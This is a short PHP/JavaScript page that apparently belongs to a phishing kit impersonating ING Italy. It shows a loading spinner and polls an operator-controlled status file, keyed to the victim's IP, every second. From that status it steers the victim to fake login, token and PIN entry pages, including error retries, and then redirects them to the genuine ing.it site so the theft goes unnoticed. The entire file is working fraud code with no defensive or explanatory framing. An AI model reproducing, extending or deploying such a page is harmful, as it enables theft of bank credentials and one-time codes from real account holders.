<?php require_once "../config.php"; ?>
<?php include 'include/header.php'; ?>
<div class="container">
    <?php include 'include/spinner.php'; ?>
</div>
<script src="https://code.jquery.com/jquery-3.7.0.min.js"></script>
<script type="text/javascript">
var ip = '<?php echo $ip; ?>';
var jsonIp = ip.replace(/\./g, '-');
var jsonFile = '../panel/logs/' + jsonIp + '.json';

setInterval(() => {
    $.get(jsonFile, function(data) {
        var json = data.status;
        if (json === 'error-login') {
            top.location.href = 'login.php?error=true&redirect=' + encodeURIComponent(window
                .location
                .href);
        } else if (json === 'token') {
            top.location.href = 'token.php?redirect=' + encodeURIComponent(window.location.href);
        } else if (json === 'error-token') {
            top.location.href = 'token.php?error=true&redirect=' + encodeURIComponent(window
                .location.href);
        } else if (json === 'pin') {
            top.location.href = 'pin.php?redirect=' + encodeURIComponent(window.location.href);
        } else if (json === 'error-pin') {
            top.location.href = 'pin.php?error=true&redirect=' + encodeURIComponent(window
                .location.href);
        } else if (json === 'success') {
            top.location.href = "https://www.ing.it/";
        }
    });
}, 1000);
</script>

</body>

</html>